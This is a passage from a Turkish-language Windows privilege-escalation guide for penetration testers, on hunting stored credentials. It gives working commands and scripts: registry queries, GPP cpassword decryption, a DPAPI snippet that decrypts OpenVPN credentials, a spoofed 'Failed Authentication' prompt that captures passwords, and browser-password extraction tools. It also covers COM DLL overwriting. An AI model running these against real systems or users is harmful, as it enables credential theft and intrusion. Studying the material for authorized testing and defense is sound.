kanıtlamaz. Parolaları ve anahtar materyalini rutin envanter çıktısına dahil etmeyin.

Yönetilen yerel yönetici parolaları için [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kullanın. Dizin tabanlı veya Entra tabanlı depolama ve erişim denetimleri, özel bir yerel veri deposundan farklıdır; [Elasticsearch rolleri](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) de kimliği doğrulanmış bir veri deposu kullanıcısının belirli bir dizini okuyup okuyamayacağına karar verir.

### Java sunucusu eklenti arşivleri ve kimlik bilgisi yeniden kullanımı

Bazı Java sunucusu eklentileri, sunucunun `plugins` dizinindeki JAR arşivleri olarak dağıtılır. Okunabilir bir özel eklenti, gömülü bir hizmet kimlik bilgisi içeren yapılandırma veya bayt kodu barındırabilir. Arşivi yalnızca yetkiniz varsa inceleyin ve kurtarılan sırları rutin envanter çıktısına dahil etmeyin. Bir eklenti yolu tek başına sır bulunduğunu kanıtlamaz; kurtarılan bir hizmet parolası da yalnızca daha ayrıcalıklı bir hesap için geçerliyse daha yüksek ayrıcalıklara erişim sağlar. İlgili dosya ACL'lerini denetleyin ve yeniden kullanılan kimlik bilgilerini farklı sırlarla değiştirin. Dizin düzeni için [PaperMC'nin eklenti yükleme kılavuzuna](https://docs.papermc.io/paper/adding-plugins/), arşiv içeriği için [Oracle'ın JAR belgelerine](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) bakın.

### Openfire gömülü veritabanı kimlik bilgileri

Gömülü veritabanını kullanan bir Openfire kurulumu, `openfire.script` dosyasını `Openfire\embedded-db` altında tutabilir. Mevcut hesap bu dosyayı okuyabiliyorsa `OFUSER` kayıtlarını ve `passwordKey` özelliğini birlikte inceleyin. Openfire'ın [kullanıcı sağlayıcısı belgelerine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) göre parolalar düz metin olarak veya bu özellikte tutulan bir anahtarla şifrelenmiş şekilde saklanabilir. Kurtarılan bir parola, yalnızca daha ayrıcalıklı bir kimlik için hâlâ geçerliyse ayrıcalık yükseltme açısından önem taşır; dosya adı tek başına ne okuma erişimini ne de kimlik bilgilerinin yeniden kullanıldığını kanıtlar. Bu yol yalnızca envanter için bir ipucudur; veritabanı içeriğini ve kimlik bilgilerini rutin envanter çıktısına dahil etmeyin.

Ayrı bir `Openfire\conf\openfire.xml` dosyası, harici bir veritabanı kullanılsa bile yönetici konsolunun yapılandırılmış portlarını ve bağlandığı arayüzü gösterebilir. Openfire genellikle yönetici konsolunu loopback'e bağlar; dinleyici çalışıyorsa yerel bir hesap yine de bu adrese erişebilir. Gerçek dinleyiciyi, yetkili yönetici rolünü, eklenti yükleme ilkesini ve Openfire hizmet kimliğini birlikte denetleyin. Eklenti yükleyebilen bir yönetici, eklenti kodunun hizmet bağlamında çalışmasını sağlayabilir; hizmet LocalSystem olarak çalışıyorsa bu bağlam son derece ayrıcalıklı olabilir. Eşleşen bir hesap parolası veya okunabilir bir yapılandırma yolu tek başına yönetici konsoluna erişimi ya da kod yürütmeyi kanıtlamaz. Satıcının [kurulum ve eklenti yönetimi kılavuzuna](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) ve [eklenti yükleme API özelliğine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) bakın.

### Adli inceleme yönetim sunucusu yapılandırması

Genellikle `server.config.yaml` adı verilen Velociraptor sunucusu yapılandırmaları, dahili CA'nın `CA.private_key` anahtarını içerebilir. Daha düşük ayrıcalıklı bir kullanıcı bu anahtarı okuyabiliyorsa API istemci sertifikası oluşturabilir. Bunun daha yüksek ayrıcalıklara yol açıp açmayacağı sunucunun kullanıcı rollerine, API erişilebilirliğine ve sunucunun veya hedef aracının çalıştığı kimliğe bağlıdır. İstemci yapılandırması farklı materyaller içerir; bir istemci yapılandırması bulmak sunucu CA'sına erişim olduğunu göstermez. Bazı dağıtımlar CA özel anahtarını çevrimdışı tutar; bu nedenle okunabilir bir sunucu yapılandırmasında imzalama anahtarı bulunmayabilir.

Windows sunucusunda, kurulum dizinindeki **sunucu** yapılandırmasının ve korumalı yedek kopyalarının ACL'sini inceleyin. Olası konumlardan biri `%ProgramFiles%\VelociraptorServer\server.config.yaml` yoludur; farklıysa hizmet için yapılandırılmış yolu kullanın. Mevcut kimliğin dosyayı okuyabildiğini ve `CA.private_key` anahtarının gerçekten bulunduğunu doğrulayın. Özel anahtarı günlüklerde veya envanter çıktısında yazdırmayın. Satıcının `config api_client` iş akışı istemci sertifikası vermek için CA anahtarını kullanır; ancak etkili bir sunucu tarafı rolü de gerekir. Böyle bir rol oluşturmak veya değiştirmek için veri deposuna yazma erişimi ya da sunucunun yeniden başlatılması gerekebilir. Bu yazma işlemleri mümkün olmasa bile mevcut ayrıcalıklı bir sunucu kimliği bir yol sağlayabilir. Yürütme haklarına sahip API sorguları, ilgili sunucu veya aracı bağlamında çalışır; bu bağlam son derece ayrıcalıklı olabilir.

Sunucu yapılandırmasını ve yedeklerini kısıtlayıcı ACL'lerle koruyun, mümkünse CA imzalama anahtarını çevrimdışı tutun ve API rollerini ve dinleyici erişimini sınırlandırın. [Velociraptor API belgelerine](https://docs.velociraptor.app/docs/server_automation/server_api/) ve [güvenlik yapılandırması yönergelerine](https://docs.velociraptor.app/docs/deployment/security/) bakın.

### PuTTY Kimlik Bilgileri

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ayrı bir oturum yöneticisidir. Yerel şifrelenmiş deposu `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` konumunda olabilir. Dışa aktarılmış bir oturum yedeği `sessions-backup.dat` olarak adlandırılabilir ve başka bir yerde saklanabilir. [SolarWinds'in dışa aktarma kılavuzu](https://thwack.solarwinds.com/discussion/comment/115591), dışa aktarımların parola ile şifrelendiğini ve oturumlar, anahtarlar, betikler, etiketler ve ilişkiler içerebileceğini belirtir; [destek forumu](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) yerel depoyu belirtir. Önce dosya izinlerini ve yolları kontrol edin. Bu dosyalardan birini bulmak parolasını ortaya çıkarmaz veya kayıtlı kimlik bilgilerinin hâlâ geçerli olduğunu ya da daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz.

### Putty SSH Sunucu Anahtarları

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Registry'deki SSH anahtarları

SSH özel anahtarları `HKCU\Software\OpenSSH\Agent\Keys` registry anahtarında saklanabilir, bu nedenle burada ilginç bir şey olup olmadığını kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Bu yolun içinde herhangi bir girdi bulursanız, muhtemelen kayıtlı bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` hizmeti çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız, şunu çalıştırın:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Bazı ssh keys oluşturup `ssh-add` ile eklemeyi ve ssh üzerinden bir makineye giriş yapmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Katılımsız dosyalar

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM ve SYSTEM yedekleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Readable Windows Imaging (`.wim`) yedek dosyaları çevrimdışı `SAM`, `SECURITY` ve `SYSTEM` hive'ları da içerebilir. Yerel olarak erişilebilen yedekleme veya imaj dizinlerine öncelik verin ve herhangi bir şeyi çıkarmadan önce imajın **üye adlarını** inceleyin; yalnızca `.wim` dosya adı hive'ların açığa çıktığını kanıtlamaz ve rutin `install.wim`, `boot.wim` ve kurtarma imajları yaygın yanlış izlerdir. SMB paylaşımı ayrı bir erişim yoludur ve yalnızca bu paylaşım kapsam dahilindeyse kontrol edilmelidir. Microsoft'un [Windows imajı kılavuzuna](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) ve [registry hive dosyası başvurusuna](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) bakın.

### Bulut Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya arayın.

### Önbelleğe Alınmış GPP Parolası

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir grup makineye özel yerel yönetici hesapları dağıtılmasına olanak tanıyan bir özellik mevcuttu. Ancak bu yöntemin ciddi güvenlik açıkları vardı. İlk olarak, SYSVOL'de XML dosyaları olarak depolanan Group Policy Objects (GPO'lar), etki alanındaki tüm kullanıcılar tarafından erişilebilirdi. İkinci olarak, bu GPP'lerde AES256 ile şifrelenmiş parolalar, herkese açık olarak belgelenmiş varsayılan bir anahtar kullanılarak herhangi bir kimliği doğrulanmış kullanıcı tarafından çözülebilirdi. Bu durum, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine yol açabileceğinden ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, boş olmayan bir "cpassword" alanı içeren yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulduğunda işlev parolanın şifresini çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumuyla ilgili ayrıntıları içererek bu güvenlik açığının tespit edilmesine ve giderilmesine yardımcı olur.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ konumunda arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ın şifresini çözmek için:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Parolaları almak için crackmapexec kullanma:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Kimlik bilgileri içeren web.config örneği:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot'undaki yedek arşivleri

Doğrudan sunulan bir webroot'a yerleştirilmiş eski bir ZIP yedeği, önceki yapılandırma dosyalarını ve yeniden kullanılabilir kimlik bilgilerini açığa çıkarabilir. Bu durumu bir veri sızıntısı olarak değerlendirmeden önce, sitenin yapılandırılmış fiziksel yolunu ve arşive HTTP üzerinden gerçekten erişilip erişilemediğini kontrol edin. Varsayılan `C:\inetpub\wwwroot` yolu yalnızca olası bir konumdur. Hızlı bir yerel envanter, arşivleri açmadan adları ve boyutları listeleyebilir:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Bir arşiv adı, arşivin gizli bilgi içerdiğini ya da kurtarılan kimlik bilgisinin daha yüksek ayrıcalık sağladığını göstermez.

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Günlükler

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini iste

Kullanıcının kimlik bilgilerini, hatta başka bir kullanıcının kimlik bilgilerini bilme ihtimali olduğunu düşünüyorsanız, kullanıcıdan bunları **her zaman isteyebilirsiniz** (istemciden doğrudan **kimlik bilgilerini** **istemek** gerçekten **risklidir**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri içerebilecek olası dosya adları**

Geçmişte **parolaları** **düz metin** veya **Base64** biçiminde içeren bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 veritabanıları genellikle `.psafe3` uzantısını kullanır. Eşleşen bir dosya adını şifrelenmiş kasa adayı olarak değerlendirin; dosyanın varlığı, dosyayı okuyabileceğinizi, kilidini açabileceğinizi veya saklanan kimlik bilgilerini kullanabileceğinizi göstermez. Bu dosyaların nerede saklandığını incelerken erişilebilir kullanıcı profillerini ve yapılandırılmış dosya paylaşım köklerini kontrol edin.

Okunabilir bir KeePass `.kdbx` dosyası da yalnızca şifrelenmiş kasa için bir ipucudur. Kilidini açmak için gerçek ana parola ve yapılandırılmış tüm anahtar dosyası veya hesap faktörleri gerekir. Yetkili bir incelemede bir girdide LM:NT hash çifti bulunursa, [pass-the-hash](../ntlm/README.md#pass-the-hash) seçeneğini değerlendirmeden önce belirtilen hesabı ve NT hash'inin güncel olup olmadığını ve hedefin NTLM hizmeti tarafından kabul edilip edilmediğini doğrulayın. Bir kasa girdisi tek başına Administrator veya SYSTEM hakları sağlamaz; uzaktan hizmet erişimi, hesap hakları ve varsa ayrı bir hizmet yürütme adımı da geçerli olmalıdır. Envanterde veritabanı veya saklanan kimlik bilgileri yerine kasa yolunu ve okunabilirlik durumunu raporlayın.

Önerilen tüm dosyaları arayın:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geri Dönüşüm Kutusu'ndaki kimlik bilgileri

Silinmiş yedekleri ve yapılandırma arşivlerini, ayrıca adında açıkça kimlik bilgilerinden söz edilen dosyaları bulmak için erişebildiğiniz Geri Dönüşüm Kutusu girdilerini kontrol edin. Yararlı bir `.7z`, `.zip` veya `.rar` yedeği aylar öncesine ait olabilir ve sıradan bir dosya adına sahip olabilir. Windows, özgün yolu ve silinme zamanını bir `$I` kaydında, silinmiş dosyayı ise buna eşlik eden `$R` girdisinde saklar; bir arşivi açmadan önce meta verileri ve geçerli kimliğin dosyayı okuyup okuyamadığını inceleyin. Görünürlük birime, kullanıcı SID'sine ve dosya izinlerine bağlıdır; bu nedenle boş bir liste, kurtarılabilir yedek bulunmadığını kanıtlamaz. Arşiv adını, geçerli bir sır içerdiğinin kanıtı olarak değil, incelenmeye değer bir aday olarak değerlendirin.

Erişilebilir, silinmiş bir `.pfx` dosyası **code-signing** için de bir ipucu olabilir. Erişilebilir bir özel anahtar içeriyorsa bu anahtar, değiştirilmiş bir PowerShell betiğini imzalayabilir; [PowerShell, özel anahtara sahip bir code-signing sertifikası gerektirir](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature) ve [AppLocker publisher kuralları, imzalayanın kimliğini ve kural kapsamını değerlendirir](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Hesaplar arası yürütme için geçerli kimliğin tam olarak ilgili betiği değiştirebilmesi, yürürlükteki bir kuralın betik ve hedef hesap için ortaya çıkan imzayı kabul etmesi ve zamanlanmış bir görevin ya da daha yüksek ayrıcalıklı başka bir bileşenin betiği gerçekten çalıştırması gerekir. Bir `.pfx` dosya adı, sertifika konusu veya yazılabilir bir betik tek başına bu zincirin varlığını kanıtlamaz. Özel anahtar içeren materyali açmadan veya görevi tetiklemeden önce meta verileri, ACL'leri, ilkeyi ve zamanlanmış komutu inceleyin.

Ayrıca kimlik bilgilerine dair ipuçları bulmak için erişilebilir mesajlaşma istemcisi profil veritabanlarını, notları ve alınan dosyaları da inceleyin. Bir BitLocker kurtarma anahtarı dışa aktarımı HTML veya TXT olarak, bazen de adlandırılmış bir yedekleme arşivinin içinde saklanmış olabilir. Böyle bir materyal, daha eski yedekleri içeren ayrı bir şifrelenmiş veri birimine erişim sağlayabilir; birimi ve arşivi yalnızca erişim yetkiniz varsa inceleyin. Bir yedek `NTDS.dit` içeriyorsa çevrimdışı etki alanı kimlik bilgilerinin kurtarılması için [yedekleme ve ayrıcalıklı gruplar iş akışında](../active-directory-methodology/privileged-groups-and-token-privileges.md) açıklandığı üzere eşleşen `SYSTEM` hive'ı da gerekir. Dosya adları ve kilitli bir birim, kullanılabilir bir kurtarma anahtarının veya etki alanı yedeğinin varlığını tek başına kanıtlamaz.

Birkaç program tarafından kaydedilmiş **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt defterinin içinde

**Kimlik bilgileri içerebilecek diğer kayıt defteri anahtarları**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Registry'den OpenSSH anahtarlarını çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome, Edge veya Firefox** parolalarının depolandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer işaretlerini ve sık kullanılanlarını da kontrol edin; parolalar buralarda depolanmış olabilir.

Geçerli kullanıcının standart Edge **Default** profili için `Login Data`, `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` konumundadır; `Local State` ise üst dizin olan `User Data` içindedir. [Microsoft varsayılan profil konumunu belgeliyor](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); başka bir profil veya `UserDataDir` ilkesi bu konumu değiştirebilir. Dosyaların bulunması yalnızca kimlik bilgisi depolama konumuna dair bir ipucudur: okunabilir dosyaları, ilgili kullanıcının DPAPI bağlamını veya yetkili başka bir anahtar materyalini ve kaydedilmiş bir oturum açma bilgisinin daha ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Yalnızca yolları listelemek için veritabanını açmak veya şifresi çözülmüş parolaları yazdırmak gerekmez.

Firefox için [Mozilla'nın belgelerine göre](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) bir profildeki `key4.db` ve `logins.json`, eşleşen anahtar ve şifrelenmiş oturum açma dosyalarıdır. Bu dosyaların bulunması yalnızca bir ipucudur: kimlik bilgilerinin kullanılabilir olduğu sonucuna varmadan önce her iki dosyanın da okunabilir olup olmadığını, kaydedilmiş girişlerin bulunup bulunmadığını ve bir Primary Password'ün anahtarı koruyup korumadığını kontrol edin. Kurtarılan bir kimlik bilgisi bir domain hesabına aitse, bu hesabın etkin grup denetimi izinlerini ve grubun [LAPS parola okuma veya şifre çözme izinlerini](../active-directory-methodology/laps.md) ayrıca inceleyin; tarayıcı kalıntıları tek başına bir yönetici erişim yolu olduğunu göstermez.

Tarayıcılardan parola çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerde yazılmış yazılım bileşenleri arasında **iletişim** kurulmasını sağlayan, Windows işletim sisteminin bünyesinde yer alan bir teknolojidir. Her COM bileşeni bir **class ID (CLSID) ile tanımlanır** ve her bileşen, interface ID'lerle (IID'ler) tanımlanan bir veya daha fazla arayüz aracılığıyla işlevsellik sunar.

COM sınıfları ve arayüzleri sırasıyla kayıt defterinde **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu kayıt defteri, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek oluşturulur = **HKEY\CLASSES\ROOT.**

Bu kayıt defterindeki CLSID'lerin altında, **DLL**'e işaret eden bir **varsayılan değer** ve **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single veya Multi) ya da **Neutral** (Thread Neutral) olabilen **ThreadingModel** adlı bir değer içeren **InProcServer32** alt anahtarını bulabilirsiniz.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu kayıt defterindeki CLSID'lerin altında, DLL'e işaret eden bir varsayılan değer ve bir değer içeren InProcServer32 alt anahtarını bulabilirsiniz...](<../../images/image (729).png>)

Temel olarak, çalıştırılacak **DLL'lerden herhangi birinin üzerine yazabilirseniz**, bu DLL farklı bir kullanıcı tarafından çalıştırıldığında **yetkilerinizi yükseltebilirsiniz**.

Saldırganların kalıcılık sağlamak için COM Hijacking'i nasıl kullandığını öğrenmek için:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve kayıt defterinde genel parola arama**

**Dosya içeriklerinde arama yapın**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir dosya adını arama**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Registry'de anahtar adlarını ve parolaları arayın**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** eklentisidir. Bu eklentiyi, **kurbanın içindeki kimlik bilgilerini arayan tüm metasploit POST modüllerini otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) bu verileri düz metin olarak kaydeden çeşitli araçlara ait **oturumları**, **kullanıcı adlarını** ve **parolaları** arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Şunu hayal edin: **SYSTEM olarak çalışan bir process, tam erişimle yeni bir process açıyor** (`OpenProcess()`). Aynı process, **ana process'in tüm açık handle'larını devralan, düşük ayrıcalıklara sahip yeni bir process de oluşturuyor** (`CreateProcess()`).\
Ardından, **düşük ayrıcalıklı process'e tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan ayrıcalıklı process'in **açık handle'ını alabilir** ve **shellcode enjekte edebilirsiniz**.\
[Bu güvenlik açığının **nasıl tespit edilip istismar edileceği** hakkında daha fazla bilgi için bu örneği okuyun.](leaked-handle-exploitation.md)\
[Farklı izin seviyeleriyle (yalnızca tam erişim değil) devralınan process ve thread'lere ait daha fazla açık handle'ın nasıl test edilip kötüye kullanılacağına dair daha kapsamlı bir açıklama için bu **diğer yazıyı okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipe** olarak adlandırılan paylaşılan bellek segmentleri, process'ler arasında iletişim ve veri aktarımını sağlar.

